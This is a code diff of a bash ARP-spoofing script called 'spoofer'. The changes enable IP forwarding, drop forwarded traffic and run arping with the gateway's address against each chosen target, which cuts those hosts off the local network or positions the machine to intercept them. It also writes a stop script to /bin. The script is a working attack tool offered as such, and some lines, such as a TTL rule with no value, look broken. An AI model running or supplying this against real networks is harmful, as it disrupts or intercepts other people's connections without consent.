@@ -7,6 +7,9 @@ iptables -I FORWARD -j DROP
 # Block hops by setting TTL to 0
 iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 2>/dev/null
 
+# Enable ip forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
 # Function to auto-detect interface
 auto_detect_interface() {
     # Get the default route interface
@@ -168,16 +171,12 @@ echo
 cat > /bin/spoofer-stop << EOF
 #!/bin/bash
 
-# Restore TTL
-iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 64
-
 # Reset forwarding policy
 iptables -P FORWARD ACCEPT
 iptables -F FORWARD
 
 # Kill arping processes
 pkill -f arping
-pkill -f arpspoof
 
 # Remove hop blocking
 iptables -t mangle -D PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0 2>/dev/null
@@ -194,8 +193,8 @@ chmod 755 /bin/spoofer-stop
         if [[ -n "$target" ]]; then
             echo " "
             echo "Blocking the target IP: $target"
-            arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 &
-            pid2=$!
+          ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
+            pid1=$!
             pids+=($pid1 )
         fi
     done <<< "$PROCESSED_TARGETS"
